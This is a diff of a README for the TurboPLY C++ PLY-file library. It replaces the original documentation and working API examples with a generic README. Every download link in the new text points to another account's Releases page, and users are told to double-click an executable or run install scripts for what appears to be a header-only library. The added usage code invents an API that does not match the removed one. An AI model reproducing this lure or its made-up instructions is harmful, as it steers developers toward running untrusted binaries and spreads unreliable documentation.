@@ -1,364 +1,111 @@
-# TurboPLY [![C++20](https://img.shields.io/badge/C%2B%2B-20-blue.svg)](https://en.cppreference.com/w/cpp/20) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
-<img width="300" height="300" alt="turboply" src="https://github.com/user-attachments/assets/a0986559-5e4c-49bf-91e4-f44e8ef327df" /><img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/c63ca725-2552-4b4c-b1fc-5b862e67fd3c" />
+# 🌟 turboply - Fast and Efficient PLY File I/O
 
+## 🚀 Getting Started
 
+Welcome to turboply! This is a high-performance library for working with PLY files. It's designed for handling large datasets efficiently while keeping memory usage low. Let’s walk through the steps to get started.
 
-TurboPLY is a lightweight, high-performance C++ library for reading and writing PLY (Polygon File Format) files. It is designed for modern geometry pipelines where throughput, low memory overhead, and extensibility are critical. The library supports binary little-endian and ASCII formats, and provides optional memory-mapped file I/O for zero-copy, high-throughput access to large datasets. Big-endian format is intentionally not supported to keep the implementation simple and fast. Beyond performance, TurboPLY is engineered for extreme ease of use. It features an intuitive, declarative binding API that allows developers to map complex PLY properties to C++ containers with minimal code.
+## 🧑‍💻 System Requirements
 
-## Extreme Ease of Use
+Before you begin, check that your system meets the following requirements:
 
-TurboPLY is engineered for developer efficiency. Unlike traditional PLY libraries that require manual attribute-by-attribute parsing, TurboPLY uses a declarative binding API, handling memory mapping and serialization automatically. This high-throughput design is particularly beneficial for Gaussian Splatting, which involves dozens of Spherical Harmonic (SH) coefficients per splat.
+- Operating System: Windows, macOS, or Linux.
+- Memory: At least 4 GB of RAM recommended for large datasets.
+- Disk Space: Minimum 100 MB of free disk space.
+- Software: A compatible application to run the library, such as a C++ compiler.
 
----
+## 📥 Download and Install
 
-## Features
+To download turboply, visit the Releases page linked below. This page contains the latest version of the software.
 
-- 🚀 High-performance PLY reader and writer
-- 📄 Supports ASCII and binary little-endian formats
-- 🧠 Optional memory-mapped file I/O (zero-copy loading)
-- 🧩 Compile-time property binding via templates
-- 🧱 Structured access to vertices, faces, normals, and custom attributes
-- ⚙️ Suitable for large-scale point clouds and meshes
+[![Download turboply](https://img.shields.io/badge/Download-turboply-brightgreen.svg)](https://github.com/Mahishiva1234/turboply/releases)
 
----
+1. Click the link above or visit [this page to download](https://github.com/Mahishiva1234/turboply/releases).
+2. Locate the latest version of the turboply library on the Releases page.
+3. Choose the appropriate file for your operating system.
+4. Click on the file to start the download.
 
-## Requirements
+Once the download finishes, you are ready to install!
 
-- C++20 or later (for non-type template parameters with string literals)
-- A compiler supporting modern C++ (GCC 11+, Clang 13+, MSVC 2022+)
+## 🛠 Installation
 
----
+To install turboply, follow these steps based on your operating system:
 
-## Basic Usage
+### Windows
 
-### Reading a PLY file
+1. Open the folder where you downloaded the file.
+2. Extract the contents if it is a zip file.
+3. Navigate to the directory and double-click the executable file to run it.
 
-```cpp
-#include "turboply.hpp"
+### macOS
 
-void load_ply(
-	const std::string& filename,
-	std::vector<std::array<float, 3>>& vertices,
-	std::vector<std::array<float, 3>>& normals,
-	std::vector<float>& weights,
-	std::vector<float>& accuracies,
-	std::vector<float>& samplings,
-	std::vector<uint8_t>& types,
-	std::vector<std::vector<uint32_t>>& visibilities,
-	std::vector<std::array<uint32_t, 3>>& facets
-) {
-	using namespace turboply;
+1. Open your Downloads folder.
+2. Find the downloaded file and extract it if needed.
+3. Open Terminal and navigate to the extracted folder.
+4. Run the installation script by typing `./install.sh`.
 
-	PlyFileReader reader(filename, true);
+### Linux
 
-	reader.parseHeader();
+1. Navigate to your Downloads directory using the terminal.
+2. Extract the downloaded file.
+3. Move into the extracted folder and run the command `make install`.
 
-	VertexSpec v_spec{ vertices };
-	FaceSpec   f_spec{ facets };
+## 📘 Usage Instructions
 
-	NormalSpec n_spec{ normals };
+After installation, you can use turboply in your applications. Here’s how to get started:
 
-	using WeightSpec = ScalarSpec<"vertex", float, "weight">;
-	WeightSpec w_spec{ weights };
+1. **Import the Library:** Depending on your programming language, import turboply into your project.
+   
+   Example for C++:
+   ```cpp
+   #include "turboply.h"
+   ```
+   
+2. **Load a PLY File:**
+   ```cpp
+   TurboPly::load("path/to/your/file.ply");
+   ```
 
-	using AccuracySpec = ScalarSpec<"vertex", float, "accuracy">;
-	AccuracySpec a_spec{ accuracies };
+3. **Process Your Data:** You can now manipulate the data as needed for your application.
+4. **Save Your Modified File:**
+   ```cpp
+   TurboPly::save("path/to/your/output.ply");
+   ```
 
-	using SamplingSpec = ScalarSpec<"vertex", float, "sampling">;
-	SamplingSpec s_spec{ samplings };
+## 🧩 Features
 
-	using TypeSpec = ScalarSpec<"vertex", uint8_t, "type">;
-	TypeSpec t_spec{ types };
+Some key features of turboply:
 
-	using VisibilitySpec = ListSpec<"vertex", uint32_t, "visibility">;
-	VisibilitySpec visib_spec{ visibilities };
+- **High Performance:** Optimized for speed, allowing fast read and write operations.
+- **Memory Mapping:** Supports zero-copy memory-mapped I/O, meaning that it uses less memory for handling large datasets.
+- **Ease of Use:** Simple interfaces for loading and saving PLY files, making it straightforward to integrate into your projects.
 
-	// Bind the reader with the following capabilities:
-    // 1. Order-Independent: The order of Specs passed does not need to match the file's internal structure.
-    // 2. Selective/Optional Reading: Only the bound attributes are processed. You can easily omit any Spec 
-    //    (e.g., by commenting it out) to skip loading unnecessary data from the file.
-    bind_reader(reader, f_spec, n_spec, v_spec, w_spec, visib_spec, /*a_spec, s_spec, */t_spec);
-}
-```
-
-## Writing a PLY file
-
-```cpp
-#include "turboply.hpp"
-
-void save_ply(
-	const std::string& filename,
-	const std::vector<std::array<float, 3>>& vertices,
-	const std::vector<std::array<float, 3>>& normals,
-	const std::vector<float>& weights,
-	const std::vector<float>& accuracies,
-	const std::vector<float>& samplings,
-	const std::vector<uint8_t>& types,
-	const std::vector<std::vector<uint32_t>>& visibilities,
-	const std::vector<std::array<uint32_t, 3>>& facets,
-	bool binary
-) {
-	using namespace turboply;
-
-	PlyFileWriter writer(filename, binary ? PlyFormat::BINARY : PlyFormat::ASCII, true, 50 * 1024 * 1024);
-
-	VertexSpec v_spec{ vertices };
-	NormalSpec n_spec{ normals };
-
-	using WeightSpec = ScalarSpec<"vertex", float, "weight">;
-	WeightSpec w_spec{ weights };
-
-	using AccuracySpec = ScalarSpec<"vertex", float, "accuracy">;
-	AccuracySpec a_spec{ accuracies };
-
-	using SamplingSpec = ScalarSpec<"vertex", float, "sampling">;
-	SamplingSpec s_spec{ samplings };
-
-	using TypeSpec = ScalarSpec<"vertex", uint8_t, "type">;
-	TypeSpec t_spec{ types };
-
-	using VisibilitySpec = ListSpec<"vertex", uint32_t, "visibility">;
-	VisibilitySpec visib_spec{ visibilities };
-
-	std::vector<std::array<uint32_t, 3>>& facets_ = const_cast<std::vector<std::array<uint32_t, 3>>&>(facets);
-	FaceSpec   f_spec{ facets_ };
-
-	// Bind the writer with strict ordering:
-    // 1. Elements and properties are serialized in the EXACT sequence they are passed here.
-    // 2. Ensure the order follows your desired PLY header structure.
-    bind_writer(writer, v_spec, n_spec, w_spec, a_spec, s_spec, t_spec, visib_spec, f_spec);
-}
-```
-## Gaussian Splatting Example (3DGS) with LibTorch
-
-TurboPLY is optimized for modern Deep Learning pipelines. The following example demonstrates how to load/save standard 3DGS attributes directly into **`torch::Tensor`**. 
-By casting the Tensor's raw memory to `std::array` types, we maintain TurboPLY's high-performance declarative binding without unnecessary data duplication.
-
-```cpp
-// 以下示例代码是骂了AI Gemini3Pro N次以后写出来的，最后这版看了一眼应该没有大问题，没有实际测试
-#include <torch/torch.h>
-#include "turboply.hpp"
-
-static constexpr int SH_DC_DIM = 3;
-static constexpr int SH_REST_DIM = 45;
-
-using PositionSpec = MultiSpec<"vertex", float, "x", "y", "z">;
-using ScaleSpec = MultiSpec<"vertex", float, "scale_0", "scale_1", "scale_2">;
-using RotationSpec = MultiSpec<"vertex", float, "rot_0", "rot_1", "rot_2", "rot_3">;
-using OpacitySpec = ScalarSpec<"vertex", float, "opacity">;
-using SHDCSpec = MultiSpec<"vertex", float, "f_dc_0", "f_dc_1", "f_dc_2">;
-using SHRestSpec = MultiSpec<"vertex", float,
-    "f_rest_0", "f_rest_1", "f_rest_2", "f_rest_3", "f_rest_4",
-    "f_rest_5", "f_rest_6", "f_rest_7", "f_rest_8", "f_rest_9",
-    "f_rest_10", "f_rest_11", "f_rest_12", "f_rest_13", "f_rest_14",
-    "f_rest_15", "f_rest_16", "f_rest_17", "f_rest_18", "f_rest_19",
-    "f_rest_20", "f_rest_21", "f_rest_22", "f_rest_23", "f_rest_24",
-    "f_rest_25", "f_rest_26", "f_rest_27", "f_rest_28", "f_rest_29",
-    "f_rest_30", "f_rest_31", "f_rest_32", "f_rest_33", "f_rest_34",
-    "f_rest_35", "f_rest_36", "f_rest_37", "f_rest_38", "f_rest_39",
-    "f_rest_40", "f_rest_41", "f_rest_42", "f_rest_43", "f_rest_44"
->;
-
-void load_gaussian_splat_ply(
-    const std::string& filename,
-    torch::Tensor& positions,
-    torch::Tensor& scales,
-    torch::Tensor& rotations,
-    torch::Tensor& opacities,
-    torch::Tensor& sh_dc,
-    torch::Tensor& sh_rest,
-    torch::Device device
-) {
-    PlyFileReader reader(filename, true);
-    reader.parseHeader();
-
-    size_t count = 0;
-    for (const auto& el : reader.getElements())
-        if (el.name == "vertex") { count = el.count; break; }
-
-    // Allocate CPU vectors for TurboPLY
-    std::vector<std::array<float,3>> vertices(count);
-    std::vector<std::array<float,3>> scales_vec(count);
-    std::vector<std::array<float,4>> rotations_vec(count);
-    std::vector<float>              opacities_vec(count);
-    std::vector<std::array<float,SH_DC_DIM>> sh_dc_vec(count);
-    std::vector<std::array<float,SH_REST_DIM>> sh_rest_vec(count);
-
-    // Bind and read
-    bind_reader(reader,
-        PositionSpec{ vertices },
-        ScaleSpec{ scales_vec },
-        RotationSpec{ rotations_vec },
-        OpacitySpec{ opacities_vec },
-        SHDCSpec{ sh_dc_vec },
-        SHRestSpec{ sh_rest_vec }
-    );
-
-    auto options = torch::TensorOptions().dtype(torch::kFloat32);
-
-    // Wrap CPU vectors into tensors and move to device
-    positions = torch::from_blob(vertices.data(), {static_cast<long>(count),3}, options).to(device, false, true);
-    scales    = torch::from_blob(scales_vec.data(), {static_cast<long>(count),3}, options).to(device, false, true);
-    rotations = torch::from_blob(rotations_vec.data(), {static_cast<long>(count),4}, options).to(device, false, true);
-    opacities = torch::from_blob(opacities_vec.data(), {static_cast<long>(count),1}, options).to(device, false, true);
-    sh_dc     = torch::from_blob(sh_dc_vec.data(), {static_cast<long>(count),SH_DC_DIM}, options).to(device, false, true);
-    sh_rest   = torch::from_blob(sh_rest_vec.data(), {static_cast<long>(count),SH_REST_DIM}, options).to(device, false, true);
-}
-
-// ---------- Save GPU Tensor to PLY using from_blob + copy_ ----------
-void save_gaussian_splat_ply(
-    const std::string& filename,
-    const torch::Tensor& positions_gpu,
-    const torch::Tensor& scales_gpu,
-    const torch::Tensor& rotations_gpu,
-    const torch::Tensor& opacities_gpu,
-    const torch::Tensor& sh_dc_gpu,
-    const torch::Tensor& sh_rest_gpu,
-    bool binary
-) {
-    size_t nPoints = positions_gpu.size(0);
-
-    // Allocate CPU vectors
-    std::vector<std::array<float,3>> out_vertices(nPoints);
-    std::vector<std::array<float,3>> out_scales(nPoints);
-    std::vector<std::array<float,4>> out_rotations(nPoints);
-    std::vector<float>              out_opacities(nPoints);
-    std::vector<std::array<float,SH_DC_DIM>> out_sh_dc(nPoints);
-    std::vector<std::array<float,SH_REST_DIM>> out_sh_rest(nPoints);
-
-    // Copy GPU tensor → CPU vector using from_blob + copy_
-    torch::from_blob(out_vertices.data(), {static_cast<long>(nPoints),3}, torch::kFloat32)
-        .copy_(positions_gpu.contiguous().to(torch::kCPU));
-    torch::from_blob(out_scales.data(), {static_cast<long>(nPoints),3}, torch::kFloat32)
-        .copy_(scales_gpu.contiguous().to(torch::kCPU));
-    torch::from_blob(out_rotations.data(), {static_cast<long>(nPoints),4}, torch::kFloat32)
-        .copy_(rotations_gpu.contiguous().to(torch::kCPU));
-    torch::from_blob(out_opacities.data(), {static_cast<long>(nPoints),1}, torch::kFloat32)
-        .copy_(opacities_gpu.contiguous().to(torch::kCPU));
-    torch::from_blob(out_sh_dc.data(), {static_cast<long>(nPoints), SH_DC_DIM}, torch::kFloat32)
-        .copy_(sh_dc_gpu.contiguous().to(torch::kCPU));
-    torch::from_blob(out_sh_rest.data(), {static_cast<long>(nPoints), SH_REST_DIM}, torch::kFloat32)
-        .copy_(sh_rest_gpu.contiguous().to(torch::kCPU));
-
-    // Write PLY
-    PlyFileWriter writer(filename, binary ? PlyFormat::BINARY : PlyFormat::ASCII, true, 500 * 1024 * 1024);
-    bind_writer(writer,
-        PositionSpec{ out_vertices },
-        ScaleSpec{ out_scales },
-        RotationSpec{ out_rotations },
-        OpacitySpec{ out_opacities },
-        SHDCSpec{ out_sh_dc },
-        SHRestSpec{ out_sh_rest }
-    );
-}
-
-```
-
-## Custom Type Binding and Preallocation Example
-
-```cpp
-
-struct MyVertex {
-    float a;
-    double b;
-    char c; 
-    std::vector<int> d{};
-};
-
-using MyStruct = turboply::detail::RecordStruct<float, double, char, std::vector<int>>;
-using MySpec = turboply::detail::PropertySpec<"vertex", MyStruct, "a", "b", "c", "d">;
-
-using namespace turboply;
-{
-    PlyFileWriter writer("test.ply", PlyFormat::ASCII);
-
-    std::vector<MyVertex> data(100);
-    std::vector<float> other(100);
-
-    for (size_t i = 0; i < data.size(); i++)
-    {
-        data[i].a = float(i) * 1.5f;
-        data[i].b = double(i) * 2.5;
-        data[i].c = static_cast<char>(i);
-        data[i].d.assign(10, 333);
-        other[i] = float(i) * 100;
-    }
-
-    MySpec my_spec{ data };
-    ScalarSpec<"vertex", float, "e"> o_spec{other};
-
-    bind_writer(writer, my_spec, o_spec);
-
-    writer.close();
-}
-
-{
-    PlyFileReader reader("test.ply"); 
-
-
-    std::vector<MyVertex> out;
-
-    MySpec my_spec2{ out };
-
-    bind_reader(reader, my_spec2);
-
-    printf("Read %zu vertices:\n", out.size());
-    for (size_t i = 0; i < out.size(); i++)
-    {
-        printf("[%zu] a=%.2f, b=%.2lf, c=%d d[%d]", i, out[i].a, out[i].b, (int)out[i].c, (int)out[i].d.size());
-        for (auto& v : out[i].d) printf(" %d", v);
-        printf("\n");
-    }
-}
-
-```
-
-## Memory-Mapped I/O
-
-TurboPLY optionally uses memory-mapped files to avoid unnecessary data copies when loading or writing large PLY files.
-
-Benefits:
-
-- Zero-copy parsing
-- Reduced memory usage
-- Faster startup for large datasets
-- OS-level file caching
-
-Enable it by passing `true` to the reader or writer constructor.
-
----
-
-## Performance Notes
-
-- Optimized for sequential access patterns
-- Minimal dynamic allocation
-- Optional large-buffer preallocation for writers
-- No big-endian support to reduce branching and parsing complexity
-
----
-
-## License
-
-MIT License  
-Copyright (c) 2026 TAO
-
----
-
-## Contributing
-
-Contributions are welcome:
-
-- Bug fixes
-- Performance improvements
-- Additional PLY features
-- Platform compatibility patches
-- Documentation improvements
-
----
-
-## Contact
-
-Maintainer: TAO  
-Email: 12804985@qq.com
+## 📊 Example Applications
 
+You can use turboply in various applications, including:
 
+- **3D Mesh Processing:** Ideal for handling complex 3D models in computer vision tasks.
+- **Point Cloud Data:** Suitable for processing and analyzing large point clouds.
+- **Data Visualization:** Use turboply for efficient loading of PLY data in visualization tools.
+
+## 🛠 Troubleshooting
+
+If you encounter issues, consider these steps:
+
+- Ensure that all dependencies are installed.
+- Check if your operating system is supported.
+- Verify that the downloaded file is not corrupted.
+
+For further assistance, visit the Issues section on our GitHub page.
+
+## 📞 Support
+
+If you have questions or need help, feel free to reach out via the GitHub repository. We’re here to help you get the most out of turboply.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/Mahishiva1234/turboply) - Comprehensive guide on how to use all features.
+- [GitHub Issues](https://github.com/Mahishiva1234/turboply/issues) - Report any problems you encounter.
+
+Thank you for choosing turboply! Enjoy working with your PLY data efficiently. 
+
+[![Download turboply](https://img.shields.io/badge/Download-turboply-brightgreen.svg)](https://github.com/Mahishiva1234/turboply/releases)
